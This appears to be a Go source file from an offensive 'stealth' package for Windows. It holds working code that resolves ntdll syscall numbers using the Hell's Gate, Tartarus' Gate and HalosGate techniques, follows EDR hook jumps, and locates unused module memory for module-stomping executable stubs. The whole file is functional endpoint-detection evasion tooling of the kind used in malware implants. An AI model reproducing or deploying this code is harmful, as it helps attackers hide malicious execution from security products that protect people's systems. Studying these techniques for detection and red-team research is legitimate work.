//go:build windows

package stealth

import (
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

const maxSSN = 0x1FFF

// isCleanPrologue checks for the canonical Nt stub prologue, handling CET endbr64 prefix.
func isCleanPrologue(addr unsafe.Pointer) bool {
	// Check for endbr64 prefix F3 0F 1E FA on Win11 CET-enabled ntdll
	if *(*uint32)(addr) == 0xFA1E0FF3 {
		addr = unsafe.Add(addr, 4)
	}
	return *(*uint32)(addr)&0x00FFFFFF == 0x00D18B4C
}

func extractSSN(addr unsafe.Pointer) (uint16, bool) {
	orig := addr
	if *(*uint32)(addr) == 0xFA1E0FF3 {
		addr = unsafe.Add(addr, 4)
	}
	if *(*uint32)(addr)&0x00FFFFFF != 0x00D18B4C {
		return 0, false
	}
	// SSN is at addr+4 (mov eax, imm32) — account for endbr prefix
	offset := uintptr(4)
	if orig != addr {
		offset += 4
	}
	ssn := *(*uint32)(unsafe.Add(orig, offset))
	if ssn == 0 || ssn > maxSSN {
		return 0, false
	}
	return uint16(ssn), true
}

// followJMP follows an E9 JMP rel32 hook (Tartarus' Gate) to the trampoline.
// Returns nil if not a JMP.
func followJMP(addr unsafe.Pointer) unsafe.Pointer {
	if *(*byte)(addr) != 0xE9 {
		return nil
	}
	rel := int32(*(*uint32)(unsafe.Add(addr, 1)))
	return unsafe.Add(addr, uintptr(int64(rel)+5))
}

// resolveViaExport resolves a syscall SSN by parsing the ntdll export table.
// It implements a composed resolver chain: Hell's Gate (direct) → Tartarus' Gate
// (follow JMP hook) → HalosGate (neighbor scanning) → error (caller fallback).
func resolveViaExport(name string, seed byte) (uint16, error) {
	_ = seed

	ntdllBase, err := getModuleBase("ntdll.dll")
	if err != nil {
		return 0, fmt.Errorf("resolveViaExport: ntdll base not found: %w", err)
	}

	addr, err := resolveExportAddrFromBase(ntdllBase, name)
	if err != nil {
		return 0, fmt.Errorf("resolveViaExport: %s: %w", name, err)
	}

	// 1) Hell's Gate: direct prologue
	if ssn, ok := extractSSN(addr); ok {
		return ssn, nil
	}

	// 2) Tartarus' Gate: follow JMP hook into EDR trampoline where prologue is restored
	if dest := followJMP(addr); dest != nil {
		if ssn, ok := extractSSN(dest); ok {
			return ssn, nil
		}
		// Also check one level deeper: EDR may chain JMPs
		if dest2 := followJMP(dest); dest2 != nil {
			if ssn, ok := extractSSN(dest2); ok {
				return ssn, nil
			}
		}
	}

	// 3) HalosGate: neighbor scanning — find nearby clean Nt stubs and infer by RVA order.
	// Build sorted Nt export list and scan +/- neighbors for clean prologue.
	if ssn, err := halosGateResolve(ntdllBase, name, addr); err == nil {
		return ssn, nil
	}

	return 0, fmt.Errorf("resolveViaExport: %s: prologue hooked and HalosGate failed at 0x%X", name, uintptr(addr))
}

// halosGateResolve implements HalosGate: scan neighbors of the target export
// (sorted by RVA) for a clean stub and infer target SSN by delta.
func halosGateResolve(base unsafe.Pointer, targetName string, targetAddr unsafe.Pointer) (uint16, error) {
	exports, err := getNtExportsSorted(base)
	if err != nil {
		return 0, err
	}
	// Find target index by address
	targetIdx := -1
	for i, e := range exports {
		if e.addr == targetAddr {
			targetIdx = i
			break
		}
	}
	if targetIdx == -1 {
		// Fallback: find by name
		for i, e := range exports {
			if strings.EqualFold(e.name, targetName) {
				targetIdx = i
				break
			}
		}
	}
	if targetIdx == -1 {
		return 0, fmt.Errorf("HalosGate: target not found in sorted exports")
	}
	// Scan neighbors outward up to 16 entries
	for distance := 1; distance <= 16; distance++ {
		for _, dir := range []int{-1, 1} {
			neighborIdx := targetIdx + dir*distance
			if neighborIdx < 0 || neighborIdx >= len(exports) {
				continue
			}
			neighbor := exports[neighborIdx]
			if ssn, ok := extractSSN(neighbor.addr); ok {
				// Infer: targetSSN = neighborSSN + (targetIdx - neighborIdx)
				delta := targetIdx - neighborIdx
				inferred := int(ssn) + delta
				if inferred > 0 && inferred <= maxSSN {
					return uint16(inferred), nil
				}
			} else if dest := followJMP(neighbor.addr); dest != nil {
				if ssn, ok := extractSSN(dest); ok {
					delta := targetIdx - neighborIdx
					inferred := int(ssn) + delta
					if inferred > 0 && inferred <= maxSSN {
						return uint16(inferred), nil
					}
				}
			}
		}
	}
	return 0, fmt.Errorf("HalosGate: no clean neighbor found within window")
}

type ntExport struct {
	name string
	rva  uint32
	addr unsafe.Pointer
}

func getNtExportsSorted(base unsafe.Pointer) ([]ntExport, error) {
	dos := (*peImageDosHeader)(base)
	if dos.e_magic != 0x5A4D {
		return nil, fmt.Errorf("invalid DOS signature")
	}
	nt := (*peImageNtHeaders64)(unsafe.Add(base, uintptr(dos.e_lfanew)))
	if nt.Signature != 0x00004550 {
		return nil, fmt.Errorf("invalid NT signature")
	}
	exportDirRVA := nt.OptionalHeader.DataDirectory[0].VirtualAddress
	if exportDirRVA == 0 {
		return nil, fmt.Errorf("no export directory")
	}
	exportDir := (*peImageExportDirectory)(unsafe.Add(base, uintptr(exportDirRVA)))
	names := (*[1 << 20]uint32)(unsafe.Add(base, uintptr(exportDir.AddressOfNames)))
	ordinals := (*[1 << 20]uint16)(unsafe.Add(base, uintptr(exportDir.AddressOfNameOrdinals)))
	functions := (*[1 << 20]uint32)(unsafe.Add(base, uintptr(exportDir.AddressOfFunctions)))

	var out []ntExport
	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		namePtr := (*[256]byte)(unsafe.Add(base, uintptr(names[i])))
		var nameBytes []byte
		for j := 0; j < 256; j++ {
			if namePtr[j] == 0 {
				break
			}
			nameBytes = append(nameBytes, namePtr[j])
		}
		if len(nameBytes) == 0 {
			continue
		}
		name := string(nameBytes)
		if !strings.HasPrefix(name, "Nt") && !strings.HasPrefix(name, "Zw") {
			continue
		}
		ordinal := ordinals[i]
		rva := functions[ordinal]
		if rva == 0 {
			continue
		}
		out = append(out, ntExport{name: name, rva: rva, addr: unsafe.Add(base, uintptr(rva))})
	}
	// Sort by RVA (SSN order)
	for i := 0; i < len(out); i++ {
		for j := i + 1; j < len(out); j++ {
			if out[j].rva < out[i].rva {
				out[i], out[j] = out[j], out[i]
			}
		}
	}
	return out, nil
}

// --- PE parsing helpers ---

type peImageDosHeader struct {
	e_magic  uint16
	_        [58]uint16
	e_lfanew int32
}

type peImageNtHeaders64 struct {
	Signature      uint32
	FileHeader     peImageFileHeader
	OptionalHeader peImageOptionalHeader64
}

type peImageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type peImageOptionalHeader64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]peImageDataDirectory
}

type peImageDataDirectory struct {
	VirtualAddress uint32
	Size           uint32
}

type peImageExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// peImageSectionHeader mirrors IMAGE_SECTION_HEADER (40 bytes on disk).
type peImageSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

// ModuleSlack reports the reserved-but-unused "tail slack" of a loaded module:
// the range between the end of the last section and SizeOfImage. This space
// belongs to the image mapping (VirtualQuery reports Type=MEM_IMAGE for it)
// and is unused by the module, making it a candidate for committing small
// executable stubs without creating a private executable region.
//
// ok is false when the module cannot be resolved or has no usable slack.
// Verification note: committing inside this range (VirtualAlloc MEM_COMMIT)
// is the documented module-stomping primitive; the caller must treat a failed
// commit as a fallback signal, not an error.
func ModuleSlack(name string) (base uintptr, slackOff uintptr, slackLen uintptr, ok bool) {
	basePtr, err := getModuleBase(name)
	if err != nil {
		return 0, 0, 0, false
	}
	dos := (*peImageDosHeader)(basePtr)
	if dos.e_magic != 0x5A4D {
		return 0, 0, 0, false
	}
	nt := (*peImageNtHeaders64)(unsafe.Add(basePtr, uintptr(dos.e_lfanew)))
	if nt.Signature != 0x00004550 || nt.OptionalHeader.Magic != 0x20B {
		return 0, 0, 0, false
	}

	align := nt.OptionalHeader.SectionAlignment
	if align == 0 {
		return 0, 0, 0, false
	}
	sectionTable := unsafe.Add(basePtr, uintptr(dos.e_lfanew)+4+20+uintptr(nt.FileHeader.SizeOfOptionalHeader))

	var maxEnd uint32
	for i := 0; i < int(nt.FileHeader.NumberOfSections); i++ {
		sec := (*peImageSectionHeader)(unsafe.Add(sectionTable, uintptr(i)*unsafe.Sizeof(peImageSectionHeader{})))
		raw := sec.VirtualSize
		if sec.SizeOfRawData > raw {
			raw = sec.SizeOfRawData
		}
		end := sec.VirtualAddress + raw
		// Round to section alignment like the loader does.
		end = (end + align - 1) &^ (align - 1)
		if end > maxEnd {
			maxEnd = end
		}
	}
	if maxEnd == 0 || maxEnd >= nt.OptionalHeader.SizeOfImage {
		return 0, 0, 0, false
	}
	return uintptr(basePtr), uintptr(maxEnd), uintptr(nt.OptionalHeader.SizeOfImage - maxEnd), true
}

func getModuleBase(name string) (unsafe.Pointer, error) {
	dll := windows.NewLazySystemDLL(name)
	if err := dll.Load(); err != nil {
		return nil, fmt.Errorf("getModuleBase: LoadLibrary(%s): %w", name, err)
	}
	h := dll.Handle()
	if h == 0 {
		return nil, fmt.Errorf("getModuleBase: %s returned null handle", name)
	}
	// Handle() is the in-process module base address (raw OS address, not
	// Go-managed memory). Carry it as an unsafe.Pointer so PE parsing uses
	// unsafe.Add for offsets instead of uintptr -> pointer conversions.
	return unsafe.Add(nil, h), nil
}

func resolveExportAddrFromBase(base unsafe.Pointer, funcName string) (unsafe.Pointer, error) {
	dos := (*peImageDosHeader)(base)
	if dos.e_magic != 0x5A4D {
		return nil, fmt.Errorf("invalid DOS signature: 0x%04X", dos.e_magic)
	}

	nt := (*peImageNtHeaders64)(unsafe.Add(base, uintptr(dos.e_lfanew)))
	if nt.Signature != 0x00004550 {
		return nil, fmt.Errorf("invalid NT signature: 0x%08X", nt.Signature)
	}

	if nt.OptionalHeader.Magic != 0x20B {
		return nil, fmt.Errorf("unsupported optional header magic: 0x%04X", nt.OptionalHeader.Magic)
	}

	exportDirRVA := nt.OptionalHeader.DataDirectory[0].VirtualAddress
	exportDirSize := nt.OptionalHeader.DataDirectory[0].Size
	if exportDirRVA == 0 {
		return nil, fmt.Errorf("no export directory")
	}

	exportDir := (*peImageExportDirectory)(unsafe.Add(base, uintptr(exportDirRVA)))
	if exportDirSize < uint32(unsafe.Sizeof(peImageExportDirectory{})) {
		return nil, fmt.Errorf("export directory too small: %d bytes", exportDirSize)
	}

	names := (*[1 << 20]uint32)(unsafe.Add(base, uintptr(exportDir.AddressOfNames)))
	ordinals := (*[1 << 20]uint16)(unsafe.Add(base, uintptr(exportDir.AddressOfNameOrdinals)))
	functions := (*[1 << 20]uint32)(unsafe.Add(base, uintptr(exportDir.AddressOfFunctions)))

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		namePtr := (*[256]byte)(unsafe.Add(base, uintptr(names[i])))
		var nameBytes []byte
		for j := 0; j < 256; j++ {
			if namePtr[j] == 0 {
				break
			}
			nameBytes = append(nameBytes, namePtr[j])
		}
		if nameBytes == nil {
			continue
		}
		if strings.EqualFold(string(nameBytes), funcName) {
			ordinal := ordinals[i]
			funcRVA := functions[ordinal]
			if funcRVA == 0 {
				return nil, fmt.Errorf("export %s has null RVA", funcName)
			}
			return unsafe.Add(base, uintptr(funcRVA)), nil
		}
	}

	return nil, fmt.Errorf("export %s not found (exported names: %d)", funcName, exportDir.NumberOfNames)
}
